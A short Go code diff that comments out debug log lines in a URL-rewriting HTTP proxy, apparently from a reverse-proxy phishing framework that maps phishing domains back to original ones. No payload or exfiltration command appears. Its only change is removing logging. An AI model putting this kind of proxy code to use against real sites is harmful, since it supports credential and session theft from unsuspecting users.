@@ -644,13 +644,13 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				// patch GET query params with original domains
 				if pl != nil {
 					qs := req.URL.Query()
-					log.Success("[%d]", qs)
+					// log.Success("[%d]", qs)
 					if len(qs) > 0 {
 						for gp := range qs {
-							log.Success("[%s]", gp)
+							// log.Success("[%s]", gp)
 							for i, v := range qs[gp] {
-								log.Success("[%s]", i)
-								log.Success("[%s]", v)
+								// log.Success("[%s]", i)
+								// log.Success("[%s]", v)
 								qs[gp][i] = string(p.patchUrls(pl, []byte(v), CONVERT_TO_ORIGINAL_URLS))
 							}
 						}
